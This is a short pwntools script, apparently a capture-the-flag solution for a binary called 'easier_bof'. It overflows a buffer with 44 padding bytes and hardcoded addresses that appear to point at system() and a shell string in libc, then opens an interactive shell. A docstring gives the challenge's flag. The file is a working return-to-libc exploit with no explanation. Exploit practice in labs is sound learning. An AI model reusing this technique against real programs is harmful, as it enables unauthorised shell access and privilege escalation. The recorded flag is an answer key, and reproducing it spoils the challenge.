from pwn import *

payload = ""
for i in range(44) :
    payload += "A"
payload += p32(0xb7e5b310)
payload += "AAAA"
payload += p32(0xb7f7dcec)

p = process(["/home/easier_bof/easier_bof",payload])
p.interactive()

"""
answer = TH1S_W45_34513R_B0F_A6871902454446FEE0E5BD265D81C7DC
"""
